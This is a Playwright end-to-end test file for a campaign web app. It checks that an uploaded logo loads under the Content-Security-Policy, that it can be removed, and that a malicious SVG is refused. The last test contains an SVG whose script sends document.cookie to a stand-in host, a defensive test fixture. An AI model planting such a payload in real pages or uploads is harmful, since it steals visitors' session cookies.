import { expect, test } from "@playwright/test";

import {
  COORDINATION,
  campaignOrigin,
  FIRST_CAMPAIGN,
  mediaConfigured,
} from "./config.ts";
import { openManagement, openTab, signIn } from "./helpers.ts";

// The campaign logo, across the whole stack: uploaded through the API,
// stored in the object store, and fetched by the BROWSER from an origin
// that is not the application's.
//
// That last part is the reason this spec exists rather than a unit test.
// The upload path is covered in Go; what only a real browser can say is
// whether the Content-Security-Policy lets the image through. Get the
// origin wrong and the picture never appears — in the console, and nowhere
// else. Here, a blocked request fails the test.

test.describe("le logo de campagne", () => {
  test.skip(
    !mediaConfigured(),
    "aucun stockage objet : lancez `task garage` et exportez les " +
      "PARAPHE_TEST_MEDIA_* qu'il imprime",
  );

  const ORIGIN = campaignOrigin(FIRST_CAMPAIGN);

  // A 2×2 PNG, built here rather than committed: the bytes have to be a
  // real image (the API decodes the header and refuses a file that lies
  // about its format), and four pixels are enough to be one.
  const PNG = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFElEQVR4nGP8z" +
      "8DAwMDAwMDAwMAAAA4EAv8B2M0AAAAASUVORK5CYII=",
    "base64",
  );

  test("téléversé, il s'affiche dans l'en-tête et sur la connexion", async ({
    page,
  }) => {
    const refusals: string[] = [];
    // A Content-Security-Policy refusal is not a failed request: the
    // browser reports it on the console and the <img> simply stays empty.
    page.on("console", (m) => {
      if (/Content Security Policy|Refused to load/i.test(m.text())) {
        refusals.push(m.text());
      }
    });

    await signIn(page, ORIGIN, COORDINATION.email, COORDINATION.password);
    await openManagement(page);

    await page
      .getByLabel("Logo de la campagne (facultatif)")
      .setInputFiles({ name: "logo.png", mimeType: "image/png", buffer: PNG });
    await expect(page.getByText("Logo enregistré.")).toBeVisible();

    // In the header, beside the paraphe mark — which STAYS: the campaign's
    // logo joins the identity, it does not replace it.
    const inHeader = page.locator("header img.logo-campagne");
    await expect(inHeader).toBeVisible();
    await expect(page.locator("header .marque svg")).toBeVisible();
    await expect(page.locator("header")).toContainText("paraphe");

    // Served by the OBJECT STORE, on its own origin — not by the API.
    const src = await inHeader.getAttribute("src");
    expect(src, "the logo is not served from the media origin").not.toMatch(
      new RegExp(`^${ORIGIN}`),
    );
    // …and the browser actually loaded it. naturalWidth stays 0 on an image
    // the policy refused, which is exactly the failure this spec is for.
    await expect
      .poll(() => inHeader.evaluate((i: HTMLImageElement) => i.naturalWidth))
      .toBeGreaterThan(0);
    expect(refusals, "the Content-Security-Policy blocked the logo").toEqual(
      [],
    );

    // The sign-in page carries it too: it is the one screen a volunteer
    // reaches before the header can show them anything of their own.
    await page.getByRole("button", { name: "déconnexion" }).click();
    await expect(
      page.getByRole("heading", { name: "Connexion" }),
    ).toBeVisible();
    await expect(page.locator("main img")).toBeVisible();
  });

  test("retiré, l'en-tête revient à l'hexagone seul", async ({ page }) => {
    await signIn(page, ORIGIN, COORDINATION.email, COORDINATION.password);
    await openManagement(page);
    await page
      .getByLabel("Logo de la campagne (facultatif)")
      .setInputFiles({ name: "logo.png", mimeType: "image/png", buffer: PNG });
    await expect(page.getByText("Logo enregistré.")).toBeVisible();

    await page.getByRole("button", { name: "Retirer le logo" }).click();
    await expect(page.getByText("Logo retiré.")).toBeVisible();
    await expect(page.locator("header img.logo-campagne")).toHaveCount(0);
    // the mark itself is untouched
    await expect(page.locator("header .marque svg")).toBeVisible();
  });

  test("un SVG porteur de script est refusé, avec la raison", async ({
    page,
  }) => {
    await signIn(page, ORIGIN, COORDINATION.email, COORDINATION.password);
    await openManagement(page);
    await page.getByLabel("Logo de la campagne (facultatif)").setInputFiles({
      name: "piege.svg",
      mimeType: "image/svg+xml",
      buffer: Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg">' +
          "<script>fetch('//ailleurs.example/'+document.cookie)</script></svg>",
      ),
    });
    // the sentence names the element AND what to do about it
    await expect(page.getByText(/SVG refusé.*<script>/)).toBeVisible();
    await expect(page.locator("header img.logo-campagne")).toHaveCount(0);
  });
});
